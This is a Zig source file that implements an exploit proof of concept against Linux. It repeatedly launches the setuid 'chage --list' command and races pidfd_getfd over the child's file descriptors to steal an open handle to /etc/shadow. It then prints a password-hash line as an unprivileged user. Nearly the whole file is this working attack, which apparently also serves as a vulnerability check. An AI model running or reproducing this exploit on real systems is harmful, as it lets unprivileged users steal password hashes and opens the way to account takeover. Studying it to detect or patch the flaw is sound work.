// SPDX-FileCopyrightText: 2026 Daniel Sampliner <samplinerD@gmail.com>
//
// SPDX-License-Identifier: GPL-2.0-only

const std = @import("std");

const config = @import("config");

pub fn main() !void {
    var fba: std.heap.FixedBufferAllocator = blk: {
        var buf: [8192]u8 = undefined;
        break :blk .init(&buf);
    };
    const alloc = fba.allocator();

    const proc_self_fd = try std.fs.openDirAbsolute("/proc/self/fd", .{});
    var path_buf: [std.fs.max_path_bytes]u8 = undefined;
    var fd_buf: [std.fs.max_path_bytes]u8 = undefined;

    var shadow: std.fs.File = undefined;

    outer: for (0..config.attempts) |attempt| {
        std.log.debug("exploit attempt: #{d}", .{attempt + 1});
        var cmd: std.process.Child = .init(&.{ "chage", "--list", config.user }, alloc);
        cmd.stdin_behavior = .Ignore;
        cmd.stdout_behavior = .Ignore;
        cmd.stderr_behavior = .Ignore;
        try cmd.spawn();

        const pidfd = pidfd_open(cmd.id, 0) catch continue;
        defer std.posix.close(pidfd);

        var pollfds = [_]std.posix.pollfd{.{
            .fd = pidfd,
            .events = std.posix.POLL.IN,
            .revents = 0,
        }};

        var retry: usize = 0;
        while (try std.posix.poll(&pollfds, 0) == 0) : (retry += 1) {
            for (3..32) |targetfd| {
                const f = shadow_file(proc_self_fd, pidfd, @intCast(targetfd), &fd_buf, &path_buf) catch continue;
                std.log.info("self fd {d} -> child fd {d} -> path /etc/shadow (attempt={d} retry={d})", .{ f.handle, targetfd, attempt, retry });
                shadow = f;
                break :outer;
            }
        }
    } else {
        std.log.err("no hit in {d} attempts", .{config.attempts});
        return error.NotVulnerable;
    }

    defer shadow.close();
    try shadow.seekTo(0);

    var reader = blk: {
        var buf: [4096]u8 = undefined;
        break :blk shadow.reader(&buf);
    };

    _ = try reader.interface.discardDelimiterInclusive('\n');
    const line = try reader.interface.takeDelimiterExclusive('\n');
    std.log.debug("2nd line of /etc/shadow: {s}", .{line});
    std.log.info("successful unprivileged read of /etc/shadow!", .{});
}

fn pidfd_open(pid: std.os.linux.pid_t, flags: u32) !std.os.linux.fd_t {
    const ret = std.os.linux.pidfd_open(pid, flags);
    switch (std.posix.errno(ret)) {
        .SUCCESS => return @intCast(ret),
        .BADF => return error.EBADF,
        .INVAL => return error.INVAL,
        .MFILE => return error.MFILE,
        .NFILE => return error.NFILE,
        .PERM => return error.PERM,
        .SRCH => return error.ESRCH,
        else => |e| return std.posix.unexpectedErrno(e),
    }
}

fn pidfd_getfd(pidfd: std.os.linux.fd_t, targetfd: std.os.linux.fd_t, flags: u32) !std.os.linux.fd_t {
    const ret = std.os.linux.pidfd_getfd(pidfd, @intCast(targetfd), flags);
    switch (std.posix.errno(ret)) {
        .SUCCESS => return @intCast(ret),
        .BADF => return error.BADF,
        .INVAL => return error.INVAL,
        .MFILE => return error.MFILE,
        .NFILE => return error.NFILE,
        .PERM => return error.PERM,
        .SRCH => return error.SRCH,
        else => |e| return std.posix.unexpectedErrno(e),
    }
}

fn shadow_file(proc_self_fd: std.fs.Dir, pidfd: std.os.linux.fd_t, targetfd: std.os.linux.fd_t, fd_buf: []u8, path_buf: []u8) !std.fs.File {
    const dupefd = try pidfd_getfd(pidfd, targetfd, 0);
    errdefer std.posix.close(dupefd);

    const path = try proc_self_fd.readLink(try std.fmt.bufPrint(fd_buf, "{d}", .{dupefd}), path_buf);
    if (!std.mem.eql(u8, path, "/etc/shadow")) return error.NotShadow;

    return .{ .handle = dupefd };
}
